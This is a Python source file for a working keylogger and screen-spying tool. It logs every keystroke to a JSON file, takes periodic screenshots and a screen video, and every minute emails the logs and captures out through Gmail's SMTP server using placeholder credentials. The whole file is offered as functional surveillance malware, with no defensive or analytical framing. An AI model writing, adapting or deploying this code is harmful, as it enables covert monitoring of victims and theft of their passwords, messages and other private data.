import os
import json
import smtplib
import schedule
import time
import cv2
import pyautogui
import numpy as np
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from datetime import datetime
from PIL import ImageGrab

# Directory where the key log file, screenshots, and videos will be saved
log_directory = r"C:\Users\ziada\PycharmProjects\Scanmylogs 1"
log_file = os.path.join(log_directory, "key_log.json")
video_file = os.path.join(log_directory, "screen_recording.avi")

# Email credentials and recipient
email_user = 'your_mail'
email_password = 'your_password'
email_to = 'your_mail'

# Ensure the directory exists
if not os.path.exists(log_directory):
    os.makedirs(log_directory)


# Function to write key logs to the file
def write_to_file(log_entry):
    if os.path.exists(log_file):
        with open(log_file, 'r+') as f:
            logs = json.load(f)
            logs.append(log_entry)
            f.seek(0)
            json.dump(logs, f, indent=4)
    else:
        with open(log_file, 'w') as f:
            json.dump([log_entry], f, indent=4)


# Function to handle key press events
def on_press(key):
    log_entry = {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'key': str(key).replace("'", "")
    }
    write_to_file(log_entry)


# Function to handle key release events (if needed)
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener


# Function to send the log file, screenshot, and video via email
def send_email():
    try:
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_to
        msg['Subject'] = 'Keylogger Log File, Screenshot, and Video'

        # Attach key log file
        if os.path.exists(log_file):
            part = MIMEBase('application', 'octet-stream')
            with open(log_file, 'rb') as f:
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_file)}')
            msg.attach(part)

        # Attach the latest screenshot
        screenshot_file = get_latest_screenshot()
        if screenshot_file:
            part = MIMEBase('application', 'octet-stream')
            with open(screenshot_file, 'rb') as f:
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(screenshot_file)}')
            msg.attach(part)

        # Attach the video file
        if os.path.exists(video_file):
            part = MIMEBase('application', 'octet-stream')
            with open(video_file, 'rb') as f:
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(video_file)}')
            msg.attach(part)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(email_user, email_password)
            server.sendmail(email_user, email_to, msg.as_string())
        print(f'Email sent to {email_to}')
    except Exception as e:
        print(f'Failed to send email: {e}')


# Function to get the latest screenshot file
def get_latest_screenshot():
    files = [f for f in os.listdir(log_directory) if f.startswith('screenshot_') and f.endswith('.png')]
    files.sort(reverse=True)
    if files:
        return os.path.join(log_directory, files[0])
    return None


# Function to capture a screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_file = os.path.join(log_directory, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    screenshot.save(screenshot_file)
    print(f'Screenshot saved to {screenshot_file}')


# Function to capture a video of the screen
def capture_video(duration=60, fps=10):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_file, fourcc, fps, screen_size)

    start_time = time.time()
    while (time.time() - start_time) < duration:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
        out.write(frame)

    out.release()
    print(f'Video saved to {video_file}')


# Schedule the email to be sent every minute
schedule.every(1).minutes.do(send_email)

# Schedule the screenshot to be taken every minute
schedule.every(1).minutes.do(capture_screenshot)

# Schedule the video to be captured every minute
schedule.every(1).minutes.do(capture_video, duration=60, fps=10)

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    while True:
        schedule.run_pending()
        time.sleep(1)
    listener.join()
